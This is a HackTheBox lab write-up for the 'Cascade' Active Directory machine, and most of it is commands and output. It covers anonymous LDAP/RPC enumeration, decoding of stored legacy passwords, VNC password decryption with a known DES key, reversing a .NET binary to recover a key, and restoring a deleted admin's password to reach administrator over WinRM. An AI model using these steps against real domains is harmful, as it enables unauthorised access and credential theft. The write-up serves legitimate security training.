---
title: "Cascade"
date: 2025-05-10
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Cascade

![](../assets/Pasted%20image%2020250510121618.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.182            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-10 12:18 CEST
Nmap scan report for 10.10.10.182
Host is up (0.041s latency).
Not shown: 65520 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-10 10:19:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|Phone|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-10T10:20:21
|_  start_date: 2025-05-10T10:16:21
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   41.61 ms 10.10.14.1
2   42.01 ms 10.10.10.182
```


We can enumerate users using `rpcclient`.

```shell
$ rpcclient -U '' -N //10.10.10.182
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

Make a list.

```shell
$ cat users | awk -F[][] '{print $2}' | sponge users
```

Searching users with `ldapsearch`, we get the password for `r.thompson`.

```shell
$ ldapsearch -x -H ldap://10.10.10.182 -D "cascade\\" -W -b "DC=cascade,DC=local" "(objectClass=user)"

Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <DC=cascade,DC=local> with scope subtree
# filter: (objectClass=user)
# requesting: ALL
#
...
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
...
cascadeLegacyPwd: clk0bjVldmE=
```

Decode it.

```shell
$ echo 'clk0bjVldmE=' | base64 -d                                    
rY4n5eva
```

`r.thompson:rY4n5eva`

We can read some shares.

![](../assets/Pasted%20image%2020250510130830.png)

In `data` there are multiple interesting files.

```shell
$ ls                                                                                                   
 ArkAdRecycleBin.log   Meeting_Notes_June_2018.html   users  'VNC Install.reg'
```

![](../assets/Pasted%20image%2020250510131428.png)

Steve says that the user `TempAdmin` has the same password as the normal admin.

On the other hand, we have a password in the `VNC Install.reg` file.

![](../assets/Pasted%20image%2020250510132601.png)

## Initial Access

Searching, there is a repo [PasswordDecrypts](https://github.com/frizb/PasswordDecrypts) that shows how to decrypt VNC passwords on Linux.

```shell
$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv 
 
00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
```

The password is valid for `s.smith`.

![](../assets/Pasted%20image%2020250510133004.png)

And has `pssession`.

```shell
$ nxc winrm 10.10.10.182 -u 's.smith' -p sT333ve2                  
WINRM       10.10.10.182    5985   CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local)
WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
```

```shell
$ evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2                                                                           
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\s.smith\Documents> whoami
cascade\s.smith
```

## Privilege Escalation

Get the flag.

```shell
*Evil-WinRM* PS C:\Users\s.smith\desktop> type user.txt
995340c15f9857424228c9319a3dc077
```

We can see that `s.smith` has a logon script.

```shell
*Evil-WinRM* PS C:\users\s.smith> net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User's comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
```

Locate it and read it.

```shell
*Evil-WinRM* PS C:\users\s.smith> Get-ChildItem -Path C:\ -Include MapAuditDrive.vbs -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Windows\SYSVOL\domain\scripts


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/15/2020   9:50 PM            258 MapAuditDrive.vbs
```

```shell
*Evil-WinRM* PS C:\users\s.smith> type C:\Windows\SYSVOL\domain\scripts\MapAuditDrive.vbs
'MapAuditDrive.vbs
Option Explicit
Dim oNetwork, strDriveLetter, strRemotePath
strDriveLetter = "F:"
strRemotePath = "\\CASC-DC1\Audit$"
Set oNetwork = CreateObject("WScript.Network")
oNetwork.MapNetworkDrive strDriveLetter, strRemotePath
WScript.Quit
```

Enumerating SMB shares with `s.smith`, we can enter `Audit$`.

```shell
$ smbclient -U 's.smith%sT333ve2' //10.10.10.182/Audit$ 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 19:01:26 2020
  ..                                  D        0  Wed Jan 29 19:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 22:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 19:00:20 2020
  DB                                  D        0  Tue Jan 28 22:40:59 2020
  RunAudit.bat                        A       45  Wed Jan 29 00:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 07:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 07:38:38 2019
  x64                                 D        0  Sun Jan 26 23:25:27 2020
  x86                                 D        0  Sun Jan 26 23:25:27 2020
```

Inside the `DB` directory there is a `.db` file. Get it and use `strings` on it. We see the password but it's encrypted.

![](../assets/Pasted%20image%2020250510135911.png)

Get `CascAudit.exe` and open it with `ILSpy` or `dotPeek`.

![](../assets/Pasted%20image%2020250510140337.png)
![](../assets/Pasted%20image%2020250510140404.png)

Having the cipher and algorithm, we can make a decrypter function in Python or use [CyberChef](https://gchq.github.io/CyberChef/).

![](../assets/Pasted%20image%2020250510140553.png)

So `arksvc:w3lc0meFr31nd`

Reenter with the `arksvc` user.

```shell
$ evil-winrm -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\arksvc\Documents> whoami
cascade\arksvc
```

This user is in the `AD Recycle Bin` group and we know that a user `TempAdmin` with the same password as `administrator` has been deleted, so by enumerating deleted objects we can get the admin's password.

```shell
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

```shell
*Evil-WinRM* PS C:\> Get-ADObject -ldapfilter "(&(objectclass=user)(isDeleted=TRUE))" -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=CASC-WS1\0ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN=Deleted Objects,DC=cascade,DC=local
Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059

*Evil-WinRM* PS C:\> Get-ADObject -ldapfilter "(&(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))" -IncludeDeletedObjects -Properties *


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
...
```

```shell
$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d    
baCT3r1aN00dles
```

Enter as `administrator` via `evil-winrm`.

```shell
$ evil-winrm -i 10.10.10.182 -u administrator -p baCT3r1aN00dles
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cascade\administrator
```

## Post Exploitation

Get the flag.

```shell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
8071c9d5398ae77294c2b756de6a1e20
```
